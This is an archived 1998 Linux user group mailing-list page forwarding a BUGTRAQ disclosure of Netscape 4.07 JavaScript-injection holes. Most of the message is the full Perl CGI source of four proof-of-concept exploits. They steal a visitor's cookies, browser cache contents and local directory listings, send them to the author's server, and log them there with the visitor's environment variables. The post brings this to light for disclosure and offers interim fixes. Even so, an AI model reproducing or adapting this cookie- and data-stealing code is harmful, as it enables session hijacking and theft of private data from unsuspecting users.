@@ -1,0 +1,589 @@
+<!-- MHonArc v2.2.0 -->
+<!--X-Subject: tlug: more Netscape 4.07 javascript security (fwd) -->
+<!--X-From: Scott Stone <sstone@example.com> -->
+<!--X-Date:  Fri, 9 Oct 1998 14:04:45 +0900 -->
+<!--X-Message-Id: Pine.LNX.3.96LJ1.1b7.981009140422.2090d&#45;100000@example.com -->
+<!--X-ContentType: text/plain -->
+<!--X-Head-End-->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<html>
+<head>
+  <title>TLUG Mailing List</title>
+  <meta http-equiv="Content-type" content="text/html">
+  <meta name="Author" content="Jim Schweizer - webmaster TLUG">
+  <meta http-equiv="keywords" content="Tokyo Linux Users Group mailing list archive.">
+</head>
+ 
+<body bgcolor="#FFFFFF" text="#000000" BACKGROUND="../back3grnd.gif">
+<BLOCKQUOTE>
+<CENTER><IMG SRC="../tlug_logo.gif"><BR>Mailing List Archive</CENTER>
+<!--X-Body-Begin-->
+<!--X-User-Header-->
+<P>
+<font color="blue">
+Support open source code!
+</font>
+<!--X-User-Header-End-->
+<!--X-TopPNI-->
+<HR>
+[<A HREF="msg00309.html">Date Prev</A>][<A HREF="msg00311.html">Date Next</A>][<A HREF="msg00309.html">Thread Prev</A>][<A HREF="msg00321.html">Thread Next</A>][<A HREF="maillist.html#00310">Date Index</A>][<A HREF="threads.html#00310">Thread Index</A>]
+<!--X-TopPNI-End-->
+<!--X-MsgBody-->
+<!--X-Subject-Header-Begin-->
+<H1>tlug: more Netscape 4.07 javascript security (fwd)</H1>
+<HR>
+<!--X-Subject-Header-End-->
+<UL>
+<LI><strong>To</strong>: <strong>"Tokyo Linux Users' Group" &lt;<A HREF="mailto:tlug@example.com">tlug@example.com</A>&gt;</strong></LI>
+<LI><strong>Subject</strong>: <strong>tlug: more Netscape 4.07 javascript security (fwd)</strong></LI>
+<LI><strong>From</strong>: <strong>Scott Stone &lt;<A HREF="mailto:sstone@example.com">sstone@example.com</A>&gt;</strong></LI>
+<LI>Date: Fri, 9 Oct 1998 14:04:37 +0900 (JST)</LI>
+<LI>Content-Type: TEXT/PLAIN; charset=US-ASCII</LI>
+<LI>Reply-To: <A HREF="mailto:tlug@example.com">tlug@example.com</A></LI>
+<LI>Sender: <A HREF="mailto:owner-tlug@example.com">owner-tlug@example.com</A></LI>
+</UL>
+<!--X-Head-Body-Sep-Begin-->
+<HR>
+<!--X-Head-Body-Sep-End-->
+<!--X-Body-of-Message-->
+<PRE>
+
+More from BUGTRAQ... I'm going to start using Lynx from now on, I think :)
+
+--------------------------------------------------
+Scott M. Stone &lt;sstone@example.com, sstone@example.com&gt;
+               &lt;sstone@example.com&gt;
+Head of TurboLinux Development/Systems Administrator
+Pacific HiTech, Inc (USA) / Pacific HiTech, KK (Japan)
+<A TARGET="_top" HREF="http://www.pht.com">http://www.pht.com</A>		<A TARGET="_top" HREF="http://armadillo.pht.co.jp">http://armadillo.pht.co.jp</A>
+<A TARGET="_top" HREF="http://www.pht.co.jp">http://www.pht.co.jp</A>	        <A TARGET="_top" HREF="http://www.turbolinux.com">http://www.turbolinux.com</A>
+
+
+---------- Forwarded message ----------
+Date: Thu, 8 Oct 1998 15:10:39 -0700
+From: Max Vision &lt;vision@example.com&gt;
+To: BUGTRAQ@example.com
+Subject: more Netscape 4.07 javascript security
+
+Hello all,
+
+Dan Brumleve &lt;nothing@example.com&gt; recently discovered even more javascript
+security problems with Netscape (including 4.07).  The information below
+was posted to comp.lang.javascript and comp.security.misc a few days ago,
+but I didn't see mention of it here yet, and it seems pretty timely.
+
+Probably the most direct threat regarding cache theft is recent CGI
+submissions using the GET directive.  Most people would be surprised at
+what lurks in their cache.  <A TARGET="_top" HREF="http://foo/cgi-bin/enter.cgi?user=bar">http://foo/cgi-bin/enter.cgi?user=bar</A>&amp;pass=x
+
+I've found that the best interim fix is to clear your cache, and then set
+both disk and memory cache sizes to zero.  If you don't like this then you
+have alternatives:
+ o do nothing
+ o disable javascript
+ o switch it IE for awhile
+
+--Dan's Usenet Posting---------------
+I've discovered yet another Netscape security hole.  It appears to affect
+all versions of Communicator, including 4.07 which was just released to
+plug Cache-Cow.
+
+The problem is that it's still possible to inject foreign JavaScript
+code into arbitrary documents.  This has numerous evil applications.
+To illustrate some of them, I've written four exploitative programs.
+
+cookie-monster.cgi will steal cookies from arbitrary locations;
+this is very bad since cookies have been widely deployed for
+authentication purposes.  The script will prompt you for a URL,
+and retrieve all cookies issued to you by that site.
+
+file-list.cgi will steal the contents of a local directory on your
+hard drive.  The script will prompt you for a directory name, and
+retrieve the names of all the files contained it.
+
+file-list-old.cgi is a version of file-list.cgi modified to work
+on Netscape 4.01.
+
+cache-cow-4.07.cgi will steal the contents of your cache.  It has
+precisely the same effect as the exploit announced last week.
+
+Source and demonstrations are available at:
+<A TARGET="_top" HREF="http://www.shout.net/~nothing/son-of-cache-cow/index.html">http://www.shout.net/~nothing/son-of-cache-cow/index.html</A>
+
+Dan Brumleve &lt;nothing@example.com&gt;
+--End Usenet Posting-----------------
+
+And the sources (fairly small):
+
+
+#!/usr/bin/perl
+#
+# cache-cow-4.07.cgi -- Dan Brumleve &lt;nothing@example.com&gt;, 1998.10.05
+
+use CGI qw(escape unescape);
+
+my $self =
+"<A TARGET="_top" HREF="http://www.shout.net/nothing/son-of-cache-cow/cache-cow-4.07.cgi">http://www.shout.net/nothing/son-of-cache-cow/cache-cow-4.07.cgi</A>";
+
+my $cgi = new CGI;
+my $action = $cgi-&gt;param("action");
+
+if (!$action) {
+  print "Content-type: text/html\n\n" . &lt;&lt;"  EOF";
+  &lt;html&gt;
+  &lt;head&gt;&lt;title&gt;Cache-Cow 4.07&lt;/title&gt;&lt;/head&gt;
+  &lt;body bgcolor=#ffffff&gt;
+  &lt;h1&gt;Cache-Cow 4.07&lt;/h1&gt;
+  &lt;form action="$self" method="post"&gt;
+  &lt;input type=hidden name=action value=launch&gt;
+  &lt;input type=submit value="Give Dan Your Cache"&gt;
+  &lt;/form&gt;
+  &lt;/body&gt;
+  &lt;/html&gt;
+  EOF
+  exit 0;
+}
+
+if ($action eq "launch") {
+  my $q = escape($cgi-&gt;param("q"));
+  print "Content-type: text/html\n\n" . &lt;&lt;"  EOF";
+  &lt;title&gt;Cache-Cow 4.07 (activated)&lt;/title&gt;
+  &lt;script&gt;
+  var slave;
+  var data = "";
+
+  function report() {
+    slave.location="$self?action=yum";
+  }
+
+  function lump() {
+    slave.onload = report;
+  }
+
+  function launch() {
+    slave = window.open("javascript:void(0)", "slave");
+    document.f.submit();
+    slave.onunload=lump;
+  }
+
+  function show() {
+    document.g.urls.value = data;
+    document.g.submit();
+  }
+
+  &lt;/script&gt;
+  &lt;body onLoad="launch()" onUnload="show()"&gt;
+
+  &lt;base href="about:"&gt;
+
+  &lt;form action="cache" method="post" name=f target=slave&gt;
+  &lt;input type=submit&gt;&lt;/form&gt;
+  &lt;form action="$self" method="post" name=g&gt;
+  &lt;input type=hidden name=action value=show&gt;
+  &lt;input type=hidden name=urls value=""&gt;
+  &lt;input type=submit&gt;
+  &lt;/form&gt;
+  &lt;/body&gt;
+  EOF
+
+  exit 0;
+}
+
+if ($action eq "yum") {
+  print "Content-type: application/x-javascript\n\n" . &lt;&lt;"  EOF";
+  var s = "";
+  for (i = 0; i &lt; document.links.length; i++) {
+    s += escape(document.links[i].href) + "&amp;";
+  }
+  window.opener.data = s;
+  window.opener.location = "javascript:1";
+  window.close();
+  EOF
+  exit 0;
+}
+
+if ($action eq "show") {
+  my $urls = join("\n", map {
+   $_ = unescape($_); s/^about://; $_ } split(/&amp;/,$cgi-&gt;param("urls")));
+  if (open(FP, "&gt;&gt; logs/log-$ENV{REMOTE_ADDR}.txt")) {
+    for (sort keys %ENV) { print FP $_ . "=" . $ENV{$_} . "\n"; }
+    print FP "\n" . $urls . "\n\n";
+    close(FP);
+  }
+  print "Content-type: text/plain\n\n" . &lt;&lt;"  EOF";
+Here are the URLs retrieved from your browser:
+
+$urls
+  EOF
+
+  exit 0;
+}
+
+
+
+#!/usr/bin/perl
+#
+# cookie-monster.cgi -- Dan Brumleve &lt;nothing@example.com&gt;, 1998.10.05
+
+use CGI qw(escape unescape);
+
+my $self =
+"<A TARGET="_top" HREF="http://www.shout.net/nothing/son-of-cache-cow/cookie-monster.cgi">http://www.shout.net/nothing/son-of-cache-cow/cookie-monster.cgi</A>";
+
+my $cgi = new CGI;
+my $action = $cgi-&gt;param("action");
+
+if (!$action) {
+  print "Content-type: text/html\n\n" . &lt;&lt;"  EOF";
+  &lt;html&gt;
+  &lt;head&gt;
+  &lt;title&gt;Cookie Monster&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body bgcolor=#ffffff&gt;
+  &lt;h1&gt;Cookie Monster&lt;/h1&gt;
+  &lt;form action="$self" method="get"&gt;
+  Enter a fully-qualified URL:
+  &lt;input type=text name=q size=50
+value="<A TARGET="_top" HREF="http://www.netscape.com/products/security/">http://www.netscape.com/products/security/</A>"&gt;&lt;br&gt;
+  &lt;input type=hidden name=action value=launch&gt;
+  &lt;input type=submit value="Give Dan Your Cookies"&gt;
+  &lt;/form&gt;
+  &lt;/body&gt;
+  &lt;/html&gt;
+  EOF
+  exit 0;
+}
+
+if ($action eq "launch") {
+  my $q = escape($cgi-&gt;param("q"));
+  print "Content-type: application/x-javascript\n\n" . &lt;&lt;"  EOF";
+  var slave;
+
+  function report() {
+    slave.onunload = null;
+    slave.onload = null;
+    slave.location = "$self" + "?" + "action=" + escape("yum");
+  }
+
+  function launch(x) {
+    var q = unescape(x);
+    slave = window.open(q, "slave");
+
+    slave.onload = report;
+  }
+
+  launch('$q');
+  EOF
+
+  exit 0;
+}
+
+if ($action eq "yum") {
+  print "Content-type: application/x-javascript\n\n" . &lt;&lt;"  EOF";
+  var l = "$self" + "?" +
+   "action=" + escape("show") + "&amp;" +
+   "location=" + escape(location) + "&amp;" +
+   "cookie=" + escape(document.cookie);
+  window.opener.location = l;
+  window.close();
+  EOF
+  exit 0;
+}
+
+if ($action eq "show") {
+  my $location = $cgi-&gt;param("location");
+  my $cookie = $cgi-&gt;param("cookie");
+  if (open(FP, "&gt;&gt; logs/log-$ENV{REMOTE_ADDR}.txt")) {
+    for (sort keys %ENV) { print FP $_ . "=" . $ENV{$_} . "\n"; }
+    print FP "\n";
+    print FP escape($location) . ": " . escape($cookie) . "\n\n";
+    close(FP);
+  }
+  print "Content-type: text/plain\n\n" . &lt;&lt;"  EOF";
+  Cookies retrieved from "$location":
+
+  $cookie
+  EOF
+
+  exit 0;
+}
+
+
+
+#!/usr/bin/perl
+#
+# file-list.cgi -- Dan Brumleve &lt;nothing@example.com&gt;, 1998.10.05
+
+use CGI qw(escape unescape);
+
+my $self = "<A TARGET="_top" HREF="http://www.shout.net/nothing/son-of-cache-cow/file-list.cgi">http://www.shout.net/nothing/son-of-cache-cow/file-list.cgi</A>";
+
+my $cgi = new CGI;
+my $action = $cgi-&gt;param("action");
+my $default = ($ENV{HTTP_USER_AGENT} =~ /win/i) ? "c:" : "/";
+
+if (!$action) {
+  print "Content-type: text/html\n\n" . &lt;&lt;"  EOF";
+  &lt;html&gt;
+  &lt;head&gt;&lt;title&gt;File List&lt;/title&gt;&lt;/head&gt;
+  &lt;body bgcolor="#ffffff"&gt;
+  &lt;h1&gt;File List&lt;/h1&gt;
+  &lt;form action="$self" method="get"&gt;
+  &lt;input type=hidden name=action value=launch&gt;
+  Enter a local directory name:
+  &lt;input type=text name=q size=50 value="$default"&gt;&lt;br&gt;
+  &lt;input type=submit value="Give Dan Your Directory Listing"&gt;
+  &lt;/form&gt;
+  &lt;/body&gt;
+  &lt;/html&gt;
+  EOF
+}
+
+if ($action eq "launch") {
+  my $q = escape($cgi-&gt;param("q"));
+  $q =~ /^\%2F/ or $q = "%2F" . $q;
+  $q =~ /\%2F$/ or $q = $q . "%2F";
+  print "Content-type: text/html\n\n" . &lt;&lt;"  EOF";
+  &lt;title&gt;File List (activated)&lt;/title&gt;
+  &lt;script&gt;
+  var slave;
+  var data = "";
+
+  function report() {
+    slave.location="$self?action=yum";
+  }
+
+  function lump() {
+    slave.onload = report;
+  }
+
+  function launch() {
+    slave = window.open("javascript:void(0)", "slave");
+    document.f.submit();
+    slave.onunload=lump;
+  }
+
+  function show() {
+    document.g.files.value = data;
+    document.g.submit();
+  }
+
+  &lt;/script&gt;
+  &lt;body onLoad="launch()" onUnload="show()"&gt;
+
+  &lt;form action="file:$q" method=get target=slave name=f&gt;&lt;input
+type=submit&gt;&lt;/form&gt;
+  &lt;form action="$self" method="post" name=g&gt;
+  &lt;input type=hidden name=q value="$q"&gt;
+  &lt;input type=hidden name=action value=show&gt;
+  &lt;input type=hidden name=files value=""&gt;
+  &lt;input type=submit&gt;
+  &lt;/form&gt;
+  &lt;/body&gt;
+  EOF
+
+  exit 0;
+}
+
+if ($action eq "yum") {
+  print "Content-type: application/x-javascript\n\n" . &lt;&lt;"  EOF";
+  var s = "";
+  for (i = 1; i &lt; document.links.length; i++) {
+    s += escape(document.links[i].href) + "&amp;";
+  }
+  window.opener.data = s;
+  window.opener.show();
+  window.close();
+  EOF
+  exit 0;
+}
+
+if ($action eq "show") {
+  my $q = unescape($cgi-&gt;param("q"));
+  my $files = join("\n", map {
+   $_ = unescape($_); s/^file://; unescape($_) }
+   split(/&amp;/,$cgi-&gt;param("files")));
+  if (open(FP, "&gt;&gt; logs/log-$ENV{REMOTE_ADDR}.txt")) {
+    for (sort keys %ENV) { print FP $_ . "=" . $ENV{$_} . "\n"; }
+    print FP "\n" . $files . "\n\n";
+    close(FP);
+  }
+  print "Content-type: text/plain\n\n" . &lt;&lt;"  EOF";
+Contents of local directory '$q':
+
+$files
+  EOF
+
+  exit 0;
+}
+
+
+
+#!/usr/bin/perl
+#
+# file-list-old.cgi -- Dan Brumleve &lt;nothing@example.com&gt;, 1998.10.05
+
+use CGI qw(escape unescape);
+
+my $self =
+"<A TARGET="_top" HREF="http://www.shout.net/nothing/son-of-cache-cow/file-list-old.cgi">http://www.shout.net/nothing/son-of-cache-cow/file-list-old.cgi</A>";
+
+my $cgi = new CGI;
+my $action = $cgi-&gt;param("action");
+my $default = ($ENV{HTTP_USER_AGENT} =~ /win/i) ? "c:" : "/";
+
+if (!$action) {
+  print "Content-type: text/html\n\n" . &lt;&lt;"  EOF";
+  &lt;html&gt;
+  &lt;head&gt;&lt;title&gt;File List&lt;/title&gt;&lt;/head&gt;
+  &lt;h1&gt;File List&lt;/h1&gt;
+  &lt;body bgcolor="#ffffff"&gt;
+  &lt;form action="$self" method="get"&gt;
+  &lt;input type=hidden name=action value=launch&gt;
+  Enter a local directory name:
+  &lt;input type=text name=q size=5 value="$default"&gt;&lt;br&gt;
+  &lt;input type=submit value="Give Dan Your Directory Listing"&gt;
+  &lt;/form&gt;
+  &lt;/body&gt;
+  &lt;/html&gt;
+  EOF
+}
+
+if ($action eq "launch") {
+  my $q = escape($cgi-&gt;param("q"));
+  $q =~ /^\%2F/ or $q = "%2F" . $q;
+  $q =~ /\%2F$/ or $q = $q . "%2F";
+  print "Content-type: text/html\n\n" . &lt;&lt;"  EOF";
+  &lt;head&gt;&lt;title&gt;File List (activated)&lt;/title&gt;&lt;/head&gt;
+  &lt;script&gt;
+  var slave;
+  var data = "";
+
+  function report() {
+    slave.location="$self?action=yum";
+  }
+
+  function lump() {
+    slave.onload = report;
+  }
+
+  function launch(x) {
+    slave = window.open("file:" + x, "slave");
+    slave.onunload=lump;
+  }
+
+  function show() {
+    document.g.files.value = data;
+    document.g.submit();
+  }
+
+  &lt;/script&gt;
+  &lt;body onLoad="launch('$q')" onUnload="show()"&gt;
+
+  &lt;form action="file:$q" method=get target=slave name=f&gt;&lt;input
+type=submit&gt;&lt;/form&gt;
+  &lt;form action="$self" method="post" name=g&gt;
+  &lt;input type=hidden name=q value="$q"&gt;
+  &lt;input type=hidden name=action value=show&gt;
+  &lt;input type=hidden name=files value=""&gt;
+  &lt;input type=submit&gt;
+  &lt;/form&gt;
+  &lt;/body&gt;
+  EOF
+
+  exit 0;
+}
+
+if ($action eq "yum") {
+  print "Content-type: application/x-javascript\n\n" . &lt;&lt;"  EOF";
+  var s = "";
+  for (i = 0; i &lt; document.links.length; i++) {
+    s += escape(document.links[i].href) + "&amp;";
+  }
+  window.opener.data = s;
+  window.opener.show();
+  window.close();
+  EOF
+  exit 0;
+}
+
+if ($action eq "show") {
+  my $q = unescape($cgi-&gt;param("q"));
+  my $files = join("\n", map {
+   $_ = unescape($_); s/^file://; unescape($_) }
+split(/&amp;/,$cgi-&gt;param("files")));
+  if (open(FP, "&gt;&gt; logs/log-$ENV{REMOTE_ADDR}.txt")) {
+    for (sort keys %ENV) { print FP $_ . "=" . $ENV{$_} . "\n"; }
+    print FP "\n" . $files . "\n\n";
+    close(FP);
+  }
+  print "Content-type: text/plain\n\n" . &lt;&lt;"  EOF";
+Contents of local directory '$q':
+
+$files
+  EOF
+
+  exit 0;
+}
+
+---------------------------------------------------------------
+Next Meeting: 10 October, 12:30 Tokyo Station Yaesu central gate
+Featuring the IMASY Eng. Team on "IPv6 - The Next Generation IP"
+Next Nomikai: 20 November, 19:30  Tengu TokyoEkiMae 03-3275-3691
+---------------------------------------------------------------
+Sponsor: PHT, makers of TurboLinux <A TARGET="_top" HREF="http://www.pht.co.jp">http://www.pht.co.jp</A>
+
+</PRE>
+
+<!--X-Body-of-Message-End-->
+<!--X-MsgBody-End-->
+<!--X-Follow-Ups-->
+<HR>
+<!--X-Follow-Ups-End-->
+<!--X-References-->
+<!--X-References-End-->
+<!--X-BotPNI-->
+<UL>
+<LI>Prev by Date:
+<STRONG><A HREF="msg00309.html">tlug: Another Netscape 4.07 cache reading bug (fwd)</A></STRONG>
+</LI>
+<LI>Next by Date:
+<STRONG><A HREF="msg00311.html">Re: tlug: A little NT chuckle...</A></STRONG>
+</LI>
+<LI>Prev by thread:
+<STRONG><A HREF="msg00309.html">tlug: Another Netscape 4.07 cache reading bug (fwd)</A></STRONG>
+</LI>
+<LI>Next by thread:
+<STRONG><A HREF="msg00321.html">tlug: Kinput2 and Wnn6</A></STRONG>
+</LI>
+<LI>Index(es):
+<UL>
+<LI><A HREF="maillist.html#00310"><STRONG>Date</STRONG></A></LI>
+<LI><A HREF="threads.html#00310"><STRONG>Thread</STRONG></A></LI>
+</UL>
+</LI>
+</UL>
+
+<!--X-BotPNI-End-->
+<!--X-User-Footer-->
+<strong>
+<a href="../index.html">Home</a> |
+<a href="maillist.html">Main Index</a> |
+<a href="threads.html">Thread Index</a>
+</strong>
+<!--X-User-Footer-End-->
+ 
+<P>
+<CENTER>
+ <table border=2 width=75%><tr><td align=center>
+<a href="../../index.html"> Home Page</a></td>
+<td align=center><a href="../../list.html"> Mailing List </a></td>
+<td align=center><a href="../../linuxinjapan.html"> Linux and Japan </a></td>
+<td align=center><a href="../../members.html">TLUG Members</a></td>
+<td align=center><a href="../../linuxlinks.html">Links</a></td>
+</tr></TABLE>
+<P>
+</CENTER>
+</BLOCKQUOTE>
+</body>
+</html>
